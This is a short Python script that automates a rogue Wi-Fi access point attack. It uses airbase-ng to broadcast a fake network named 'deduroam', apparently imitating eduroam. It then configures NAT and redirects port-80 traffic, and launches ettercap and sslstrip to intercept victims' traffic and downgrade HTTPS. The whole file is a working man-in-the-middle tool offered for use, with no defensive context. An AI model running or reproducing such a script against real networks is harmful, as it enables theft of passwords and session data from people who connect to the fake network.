#!/usr/bin/python

import os
import subprocess
import time
from monitor_management import *


def configure_dhcp():
	os.system("echo dhcp")

def make_mon():
	os.system("echo mon")
	start_monitor("wlan0")
	command= ["sudo","airbase-ng", "-e"]
	command.append("deduroam")
	command.append("-c")
	command.append("9")
	command.append("mon0")
	print(command)
	sub= subprocess.Popen(command)
	
def configure_firewall():
	os.system("echo firewall")
	os.system("sudo iptables --flush")
	os.system("sudo iptables --table nat --flush")
	os.system("sudo iptables --delete-chain")
	os.system("sudo iptables --table nat --delete-chain")
	os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
	os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000")

def setroute():
	os.system("echo route")
	os.system("sudo ifconfig at0 up")
	os.system("sudo ifconfig at0 192.168.255.1 netmask 255.255.255.0")
	os.system("route add -net 192.168.255.0 netmask 255.255.255.0 gw 192.168.255.1")
	os.system("sudo service isc-dhcp-server restart")

def runettercap():
	os.system("echo ettercap")
	command=['sudo', "ettercap", "-T", "-q", "-i" "at0"]
	sub= subprocess.Popen(command)
	time.sleep(5)

def runsslstrip():
	os.system("echo sslstrip")
	command=['sudo', "sslstrip", "-a", "-k", "-f"]
	sub= subprocess.Popen(command)
	time.sleep(5)
	
if __name__ == '__main__':
	configure_dhcp()
	make_mon()
	configure_firewall()
	setroute()
	runettercap()
	runsslstrip()
	configure_firewall()

